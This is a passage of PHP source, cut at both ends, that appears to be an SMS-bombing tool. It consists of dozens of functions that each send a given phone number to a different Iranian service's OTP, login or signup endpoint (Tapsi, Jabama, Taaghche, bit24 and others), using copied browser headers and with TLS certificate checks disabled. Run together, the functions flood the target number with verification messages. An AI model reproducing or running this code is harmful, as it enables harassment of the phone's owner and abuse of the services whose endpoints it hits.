        'DNT: 1',
        'Origin: https://snapp.doctor',
        'Referer: https://snapp.doctor/',
        'SSR-CLIENT-IP: unknown',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);


    curl_close($ch);
}

function ostadkar($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ostadkr.com/login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.ostadkr.com',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://ostadkar.ir',
        'referer: https://ostadkar.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: cross-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-serialization: IgnoreLocaleCalendar, IgnoreLocaleTimeZone',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function miare($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.miare.ir/api/otp/driver/request/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Authorization: ',
        'Connection: keep-alive',
        'Content-Type: application/json;charset=UTF-8',
        'DNT: 1',
        'Origin: https://www.miare.ir',
        'Referer: https://www.miare.ir/p/driver/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-origin',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone_number":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function tapsi_drivers($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://join.tapsi.ir/smsConfirm?phoneNumber=' . $phone . '');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: join.tapsi.ir',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'dnt: 1',
        'referer: https://join.tapsi.ir/login',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function tapsi_passenger($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.tapsi.cab/api/v2.2/user');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'DNT: 1',
        'Origin: https://app.tapsi.cab',
        'Referer: https://app.tapsi.cab/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'content-type: application/json',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'x-agent: v2.2|passenger|WEBAPP|6.5.4||5.0',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credential":{"phoneNumber":"' . $phone . '","role":"PASSENGER"},"otpOption":"SMS"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function banimode($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mobapi.banimode.com/api/v2/auth/request');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/json;charset=UTF-8',
        'DNT: 1',
        'Origin: https://www.banimode.com',
        'Referer: https://www.banimode.com/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'platform: desktop',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function drdr($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://drdr.ir/api/registerEnrollment/verifyMobile');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: drdr.ir',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'cache-control: no-store, max-age=0',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://drdr.ir',
        'referer: https://drdr.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phoneNumber":"' . $phone . '","userType":"PATIENT"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function taaghche_login($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gw.taaghche.com/v4/site/auth/login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'DNT: 1',
        'Origin: https://taaghche.com',
        'Referer: https://taaghche.com/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'content-type: application/json',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'session: undefined',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"contact":"' . $phone . '","forceOtp":false}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function taaghche_signup($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gw.taaghche.com/v4/site/auth/signup');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'DNT: 1',
        'Origin: https://taaghche.com',
        'Referer: https://taaghche.com/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'content-type: application/json',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'session: undefined',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"contact":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function komodaa($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.komodaa.com/api/v2.6/loginRC/request');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'DNT: 1',
        'Origin: https://www.komodaa.com',
        'Referer: https://www.komodaa.com/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'install-ref: WEB',
        'k-session-id: 7546b1cc4c6b6edcc4879bfcef467449-2c52fa01a76a76',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'web-user-agent: komodaa/6.3.1.266 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone_number":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function kilid($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: server.kilid.com',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'country_id: 2',
        'dnt: 1',
        'locale: FA',
        'organization: 1',
        'origin: https://kilid.com',
        'referer: https://kilid.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function ghabzino($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: application2.billingsystem.ayantech.ir',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://ghabzino.com',
        'referer: https://ghabzino.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: cross-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":null,"ApplicationVersion":"1.0.0","MobileNumber":"' . $phone . '","UniqueToken":null}}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function barghe_man($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://uiapi2.saapa.ir/api/otp/sendCode');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'DNT: 1',
        'sec-ch-ua-mobile: ?0',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json, text/plain, */*',
        'Referer: https://bargheman.com/',
        'sec-ch-ua-platform: "Windows"',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '","from_meter_buy":false}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function vandar($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.vandar.io/account/v1/check/mobile');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.vandar.io',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'access-control-allow-headers: Origin, X-Requested-With, Content-Type, Accept, Authorization, Access-Control-Allow-Origin',
        'access-control-allow-origin: *',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://account.vandar.io',
        'referer: https://account.vandar.io/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'withcredentials: false',
        'x-csrftoken: example-of-custom-header',
        'x-requested-with: XMLHttpRequest',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function behtarino($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://bck.behtarino.com/api/v1/users/phone_verification/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: bck.behtarino.com',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://behtarino.com',
        'referer: https://behtarino.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'user-id: vNfj2NSvkYC1petU1EcXCSICPEx4Ly',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function mobit($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.mobit.ir/api/web/v8/register/register');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.mobit.ir',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'client-id: mobit_web',
        'content-type: application/json;charset=UTF-8',
        'device: 1',
        'dnt: 1',
        'mbt-url: https://www.mobit.ir/',
        'origin: https://www.mobit.ir',
        'os: 3',
        'referer: https://www.mobit.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'vue: 1',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"number":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function jabama($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://taraazws.jabama.com/api/v4/account/send-code');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'DNT: 1',
        'Origin: https://www.jabama.com',
        'Referer: https://www.jabama.com/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'ab-channel: GuestDesktop,2.16.2,Windows,10,undefined,2f1ad07b-e6ec-42a7-8b8b-42c6e07bd145',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function pinorest($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.pinorest.com/frontend/auth/login/mobile');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.pinorest.com',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://pinorest.com',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function technolife($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.technolife.ir/shop');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: www.technolife.ir',
        'accept: */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://www.technolife.ir',
        'referer: https://www.technolife.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"query check_customer_exists($username: String ,$repeat:Boolean){\\n  check_customer_exists(username: $username , repeat:$repeat){\\n    result\\n    request_id\\n    }\\n  }","variables":{"username":"' . $phone . '"},"g-recaptcha-response":""}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);


    curl_close($ch);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.technolife.ir/_next/static/chunks/pages/account/LoginWithMobileCode-8da7591d9b3ad432.js');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: www.technolife.ir',
        'accept: */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'dnt: 1',
        'referer: https://www.technolife.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: script',
        'sec-fetch-mode: no-cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);


    curl_close($ch);
}

function bit24($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://bit24.cash/app/api/auth/check-mobile');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: bit24.cash',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://bit24.cash',
        'referer: https://bit24.cash/app/login/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function tetherland($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://data.tetherland.com/api/v4/user/login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: data.tetherland.com',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://tetherland.com',
        'referer: https://tetherland.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
